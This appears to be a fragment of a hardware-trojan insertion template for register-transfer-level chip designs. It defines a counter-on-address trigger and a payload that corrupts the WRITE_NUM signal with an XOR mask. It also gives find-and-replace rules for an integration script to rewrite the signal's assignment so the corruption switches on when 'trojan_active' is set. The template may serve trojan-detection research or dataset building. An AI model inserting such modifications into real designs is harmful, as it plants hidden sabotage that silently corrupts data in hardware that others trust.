 ...
 *   
 * Trigger: Counter on Address
 * Payload: Corrupt WRITE_NUM with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt WRITE_NUM with XOR
//
// Integration Script Must Modify:
//
// IF WRITE_NUM is assigned:
//   Find: assign WRITE_NUM = data_value;
//   Replace: assign WRITE_NUM = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF WRITE_NUM is in always_ff:
//   Find: WRITE_NUM <= data_value;
//   Replace: WRITE_NUM <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
